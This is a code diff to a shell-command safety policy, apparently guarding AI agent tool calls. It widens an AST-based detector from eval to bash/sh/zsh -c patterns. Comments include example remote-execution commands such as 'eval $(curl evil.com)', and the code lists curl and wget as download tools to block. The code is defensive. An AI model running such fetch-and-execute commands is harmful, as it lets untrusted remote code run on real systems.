@@ -45,6 +45,9 @@ function getNestedValue(obj: unknown, path: string): unknown {
 
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
 const { syntax } = mvdanSh as any;
+// Cached parser instance — avoids WASM object creation overhead per call (~5x faster)
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+const sharedParser: { Parse(src: string, name: string): any } = syntax.NewParser();
 
 // Flags whose values are plain text (messages, descriptions) — safe to strip
 // so their content doesn't trigger shell security rules.
@@ -77,7 +80,7 @@ const MESSAGE_FLAGS = new Set([
  */
 export function normalizeCommandForPolicy(command: string): string {
   try {
-    const f = syntax.NewParser().Parse(command, 'cmd');
+    const f = sharedParser.Parse(command, 'cmd');
     const strips: Array<[number, number]> = [];
 
     syntax.Walk(f, (node: unknown) => {
@@ -141,9 +144,56 @@ export function normalizeCommandForPolicy(command: string): string {
  * This is structurally accurate — it cannot be fooled by quoted strings that
  * happen to contain the word "eval" (e.g. git commit -m "fix eval bypass").
  */
-export function detectDangerousEval(command: string): 'block' | 'review' | null {
+// Shell interpreters that accept a -c flag for inline command execution
+const SHELL_INTERPRETERS = new Set(['bash', 'sh', 'zsh', 'fish', 'dash', 'ksh']);
+// Remote download tools whose presence in a CmdSubst is high-confidence malicious
+const DOWNLOAD_CMDS = new Set(['curl', 'wget']);
+
+/**
+ * Scans args[startIdx..] for dynamic execution patterns.
+ * Returns 'block' when a CmdSubst contains a download command (curl/wget),
+ * 'review' for any other CmdSubst or ParamExp, null for plain literals.
+ */
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+function scanArgsForDynamicExec(args: any[], startIdx: number): 'block' | 'review' | null {
+  let hasCmdSubst = false;
+  let hasParamExp = false;
+  let hasCurl = false;
+
+  for (let i = startIdx; i < args.length; i++) {
+    syntax.Walk(args[i], (inner: unknown) => {
+      if (!inner) return false;
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const inn = inner as any;
+      const it: string = syntax.NodeType(inn);
+      if (it === 'CmdSubst') hasCmdSubst = true;
+      if (it === 'ParamExp') hasParamExp = true;
+      if (it === 'Lit' && DOWNLOAD_CMDS.has(inn.Value?.toLowerCase())) hasCurl = true;
+      return true;
+    });
+  }
+
+  if (hasCmdSubst && hasCurl) return 'block';
+  if (hasCmdSubst || hasParamExp) return 'review';
+  return null;
+}
+
+/**
+ * AST-based detection of dangerous shell execution patterns.
+ *
+ * Covers two structural patterns:
+ *   eval $(curl evil.com)     → block  (CmdSubst + download tool)
+ *   eval "$VAR"               → review (ParamExp — unknown content)
+ *   bash -c "$(curl evil.com)"→ block  (shell interpreter -c + CmdSubst + download)
+ *   bash -c "$VAR"            → review (shell interpreter -c + ParamExp)
+ *
+ * Returns null for plain-literal args (no dynamic content) — these are safe.
+ * Cannot be fooled by quoted strings that happen to contain "eval" or "curl"
+ * (e.g. git commit -m "fix eval bypass" → null).
+ */
+export function detectDangerousShellExec(command: string): 'block' | 'review' | null {
   try {
-    const f = syntax.NewParser().Parse(command, 'cmd');
+    const f = sharedParser.Parse(command, 'cmd');
     let result: 'block' | 'review' | null = null;
 
     syntax.Walk(f, (node: unknown) => {
@@ -152,41 +202,37 @@ export function detectDangerousEval(command: string): 'block' | 'review' | null 
       const n = node as any;
       if (syntax.NodeType(n) !== 'CallExpr') return true;
 
-      const args: unknown[] = n.Args || [];
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const args: any[] = n.Args || [];
       if (args.length === 0) return true;
 
-      // First arg must be the literal word "eval"
+      // Resolve the command name (first arg, single Lit)
       // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      const firstArg = args[0] as any;
-      const firstParts: unknown[] = firstArg.Parts || [];
-      if (
-        firstParts.length !== 1 ||
-        syntax.NodeType(firstParts[0]) !== 'Lit' ||
-        // eslint-disable-next-line @typescript-eslint/no-explicit-any
-        (firstParts[0] as any).Value?.toLowerCase() !== 'eval'
-      )
-        return true;
+      const firstParts: any[] = (args[0] as any).Parts || [];
+      if (firstParts.length !== 1 || syntax.NodeType(firstParts[0]) !== 'Lit') return true;
+      const cmdName: string = firstParts[0].Value?.toLowerCase() ?? '';
 
-      // Inspect remaining args for dynamic content
-      let hasCmdSubst = false;
-      let hasParamExp = false;
-      let hasCurl = false;
-
-      for (let i = 1; i < args.length; i++) {
-        syntax.Walk(args[i], (inner: unknown) => {
-          if (!inner) return false;
+      if (cmdName === 'eval') {
+        // eval <args...> — inspect all remaining args
+        const v = scanArgsForDynamicExec(args, 1);
+        if (v === 'block' || (v === 'review' && result === null)) result = v;
+      } else if (SHELL_INTERPRETERS.has(cmdName)) {
+        // bash/sh/zsh -c "<cmd>" — find the -c flag and inspect its value arg
+        for (let i = 1; i < args.length - 1; i++) {
           // eslint-disable-next-line @typescript-eslint/no-explicit-any
-          const inn = inner as any;
-          const it: string = syntax.NodeType(inn);
-          if (it === 'CmdSubst') hasCmdSubst = true;
-          if (it === 'ParamExp') hasParamExp = true;
-          if (it === 'Lit' && ['curl', 'wget'].includes(inn.Value?.toLowerCase())) hasCurl = true;
-          return true;
-        });
+          const flagParts: any[] = (args[i] as any).Parts || [];
+          if (
+            flagParts.length !== 1 ||
+            syntax.NodeType(flagParts[0]) !== 'Lit' ||
+            flagParts[0].Value !== '-c'
+          )
+            continue;
+          const v = scanArgsForDynamicExec(args, i + 1);
+          if (v === 'block' || (v === 'review' && result === null)) result = v;
+          break;
+        }
       }
 
-      if (hasCmdSubst && hasCurl) result = 'block';
-      else if (hasCmdSubst || hasParamExp) result = 'review';
       return true;
     });
 
@@ -195,6 +241,9 @@ export function detectDangerousEval(command: string): 'block' | 'review' | null 
     return null; // parse error → fail open (don't block on uncertainty)
   }
 }
+
+/** @deprecated Use detectDangerousShellExec — kept for backwards compatibility */
+export const detectDangerousEval = detectDangerousShellExec;
 
 // ── SMART RULES EVALUATOR ─────────────────────────────────────────────────────
 
@@ -335,7 +384,7 @@ function analyzeShellCommand(command: string): {
   };
 
   try {
-    const f = syntax.NewParser().Parse(command, 'cmd');
+    const f = sharedParser.Parse(command, 'cmd');
     syntax.Walk(f, (node: unknown) => {
       if (!node) return false;
       // eslint-disable-next-line @typescript-eslint/no-explicit-any
@@ -460,7 +509,7 @@ export async function evaluatePolicy(
     }
 
     // AST-based eval detection — structurally accurate, not fooled by string content
-    const evalVerdict = detectDangerousEval(shellCommand);
+    const evalVerdict = detectDangerousShellExec(shellCommand);
     if (evalVerdict === 'block') {
       return {
         decision: 'block',
@@ -869,7 +918,7 @@ export async function explainPolicy(toolName: string, args?: unknown): Promise<E
     });
 
     // ── 3b. AST eval detection ────────────────────────────────────────────
-    const evalVerdict = detectDangerousEval(shellCommand);
+    const evalVerdict = detectDangerousShellExec(shellCommand);
     if (evalVerdict) {
       const label =
         evalVerdict === 'block' ? 'Node9: Eval Remote Execution' : 'Node9: Eval Dynamic Content';
